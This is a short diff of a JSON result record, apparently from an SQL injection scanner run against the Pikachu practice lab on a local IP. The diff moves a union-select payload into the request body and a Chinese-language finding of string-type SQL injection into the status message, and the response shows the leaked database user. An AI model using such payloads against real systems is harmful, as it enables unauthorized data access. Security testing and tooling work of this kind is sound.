@@ -5,16 +5,13 @@
     "url": "http://192.168.207.128/vul/sqli/sqli_str.php?name=111&submit=查询",
     "cookie": "",
     "requestheader": "",
-    "requestbody": ""
+    "requestbody": "x' union select database(),user()#"
   },
   "response": {
     "statuscode": 200,
-    "statusmessage": "",
+    "statusmessage": "[+] 存在字符型sql注入",
     "responsetime": "",
     "responseheader": "",
     "responsebody": "<p class='notice'>your uid:pikachu <br />your email is: root@localhost</p>"
-  },
-  "payload": "x' union select database(),user()#",
-  "type": "[+] 存在字符型sql注入"
-
+  }
 }
